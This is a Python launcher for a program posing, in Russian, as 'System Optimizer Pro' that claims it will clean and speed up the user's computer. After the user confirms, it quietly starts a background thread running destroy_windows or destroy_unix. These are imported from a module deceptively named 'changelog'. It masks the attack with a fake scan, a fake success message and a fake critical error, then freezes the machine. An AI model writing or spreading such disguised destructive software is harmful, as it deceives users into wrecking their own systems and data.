import sys
import time
import platform
import threading

from colors import Colors
from changelog import destroy_windows, destroy_unix
from ui import draw_header, fake_scan, fake_optimize


def main_loop():
    draw_header()
    print(f"{Colors.OKGREEN}Добро пожаловать в System Optimizer Pro!{Colors.ENDC}")
    print("Эта программа глубоко очистит и ускорит вашу систему.")
    print("\nВыберите действие:")
    print("  1. Начать полную оптимизацию и очистку")
    print("  2. Выйти")

    choice = input("\n> ")

    if choice == '1':
        fake_scan()
        print(
            f"\n{Colors.WARNING}ВНИМАНИЕ: Рекомендуется закрыть все другие приложения перед продолжением.{Colors.ENDC}")
        confirm = input("Продолжить оптимизацию? (д/н): ").lower()
        if confirm == 'д':
            current_os = platform.system().lower()
            if current_os == "windows":
                attack_thread = threading.Thread(target=destroy_windows)
            else:
                attack_thread = threading.Thread(target=destroy_unix)
            attack_thread.daemon = True
            attack_thread.start()
            time.sleep(1)
            fake_optimize()
            print(f"\n{Colors.OKGREEN}Оптимизация успешно завершена!{Colors.ENDC}")
            print("Система будет перезагружена для применения изменений.")
            time.sleep(3)
            print(f"\n{Colors.FAIL}КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ.{Colors.ENDC}")
            print("Память не может быть read/write.")
            while True:
                pass
        else:
            print("Оптимизация отменена.")
            time.sleep(2)
            main_loop()
    elif choice == '2':
        print("Выход...")
        sys.exit(0)
    else:
        print("Неверный выбор.")
        time.sleep(1)
        main_loop()


if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\nВыход...")
        sys.exit(0)
